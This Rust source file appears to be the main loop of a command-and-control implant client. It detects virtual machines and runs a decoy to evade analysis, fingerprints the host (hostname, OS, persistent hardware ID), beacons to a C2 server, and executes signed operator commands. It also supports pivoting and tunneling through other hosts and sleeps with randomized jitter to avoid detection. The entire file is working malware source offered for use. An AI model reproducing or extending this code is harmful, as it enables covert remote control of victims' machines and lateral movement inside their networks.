pub mod config;
pub mod handlers;
pub mod scripting;
pub mod pivot; 

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::sync::mpsc; 
use std::sync::{Arc, Mutex}; 
use ed25519_dalek::{VerifyingKey, Signature, Verifier};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use rand::Rng;

use crate::common::{ClientHello, SecuredCommand, PivotFrame}; 
use crate::utils;
use crate::evasion;
use crate::transport::ClientTransport; 

use self::handlers::{HandlerContext, AgentAction};
use self::scripting::ExtensionManager;
use self::pivot::PivotManager;

pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
    let config = config::load();

    if !config.debug {
        if evasion::is_virtualized() { evasion::run_decoy(); }
    }

    let hwid = utils::get_persistent_id();
    let exe_id = utils::generate_exe_id(&config.hash_salt);
    
    // [STATE] Store the configured (Passive) sleep settings
    let mut base_sleep = config.sleep_interval;
    let mut base_jitter_min = config.jitter_min;
    let mut base_jitter_max = config.jitter_max;
    
    // [STATE] Toggle for "Active Mode"
    let mut is_active_mode = false;
    
    let proxy_handle = Arc::new(Mutex::new(None));
    let ext_manager = Arc::new(Mutex::new(ExtensionManager::new()));

    let transport = ClientTransport::new(&config);

    if config.debug {
        println!("[*] Client Started. ID: {}", hwid);
    }

    let server_pub = BASE64.decode(&config.server_public_key)?;
    let verify_key = VerifyingKey::from_bytes(&server_pub.try_into().unwrap())?;

    loop {
        let stream = match transport.connect().await {
            Ok(s) => s,
            Err(_) => { 
                tokio::time::sleep(tokio::time::Duration::from_secs(5)).await; 
                continue; 
            }
        };

        let (mut reader, mut writer) = tokio::io::split(stream);
        let (tx, mut rx) = mpsc::channel::<Vec<u8>>(100);
        let (cmd_tx, mut cmd_rx) = mpsc::channel::<SecuredCommand>(100);

        let pivot_mgr = Arc::new(Mutex::new(PivotManager::new(tx.clone())));

        // 1. Writer Task
        tokio::spawn(async move {
            while let Some(data) = rx.recv().await {
                if writer.write_u32(data.len() as u32).await.is_err() { break; }
                if writer.write_all(&data).await.is_err() { break; }
                let _ = writer.flush().await;
            }
        });

        // 2. Handshake
        let hello = ClientHello {
            hostname: hostname::get().unwrap_or("unknown".into()).to_string_lossy().into(),
            os: std::env::consts::OS.to_string(),
            computer_id: hwid.clone(),
            exe_id: exe_id.clone(),
            build_id: config.build_id.clone(),
        };
        if let Ok(j) = serde_json::to_vec(&hello) { let _ = tx.send(j).await; }

        // 3. Reader Task (The "Ear" - NEVER SLEEPS)
        let pivot_mgr_clone = pivot_mgr.clone();
        tokio::spawn(async move {
            loop {
                let len = match reader.read_u32().await { Ok(n) => n, Err(_) => break };
                let mut buf = vec![0u8; len as usize];
                if reader.read_exact(&mut buf).await.is_err() { break; }

                if let Ok(frame) = serde_json::from_slice::<PivotFrame>(&buf) {
                    pivot_mgr_clone.lock().unwrap().handle_downstream_frame(frame);
                    continue;
                }

                if let Ok(msg) = serde_json::from_slice::<SecuredCommand>(&buf) {
                    if cmd_tx.send(msg).await.is_err() { break; }
                }
            }
        });

        // 4. Main Executor Loop (The "Brain" - SLEEPS based on Mode)
        let mut last_counter = 0u64;

        while let Some(msg) = cmd_rx.recv().await {
            if msg.counter <= last_counter { continue; }
            
            let sign_bytes = msg.get_signable_bytes();
            let sig_bytes = BASE64.decode(&msg.signature).unwrap_or_default();
            let sig_arr: [u8; 64] = sig_bytes.try_into().unwrap_or([0u8; 64]);
            let sig = Signature::from_bytes(&sig_arr);

            if verify_key.verify(&sign_bytes, &sig).is_ok() {
                last_counter = msg.counter;
                if msg.command == "exit" { return Ok(()); }

                let ctx = HandlerContext {
                    proxy_handle: proxy_handle.clone(),
                    ext_manager: ext_manager.clone(),
                    c2_host: config.c2_host.clone(),
                    tx: tx.clone(),
                    pivot_mgr: pivot_mgr.clone(),
                };

                // [FIX] Process Action Result
                match handlers::dispatch(&ctx, msg).await {
                    AgentAction::UpdateConfig(s, min, max) => {
                        base_sleep = s;
                        base_jitter_min = min;
                        base_jitter_max = max;
                    },
                    AgentAction::SetMode(active) => {
                        is_active_mode = active;
                    },
                    AgentAction::None => {}
                }

                // [FIX] Calculate Sleep based on Active Mode vs Passive Config
                if is_active_mode {
                    // Active Mode: 100ms constant polling (fast tunneling)
                    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
                } else {
                    // Passive Mode: Use Jitter Config
                    if base_sleep > 0 {
                        let base_ms = base_sleep * 1000;
                        let safe_min = base_jitter_min;
                        let safe_max = if base_jitter_max < safe_min { safe_min } else { base_jitter_max };

                        let jitter_ms = if safe_max > 0 {
                            rand::thread_rng().gen_range(safe_min..=safe_max) as u64
                        } else {
                            0
                        };
                        tokio::time::sleep(tokio::time::Duration::from_millis(base_ms + jitter_ms)).await;
                    }
                }
            }
        }

        tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
    }
}
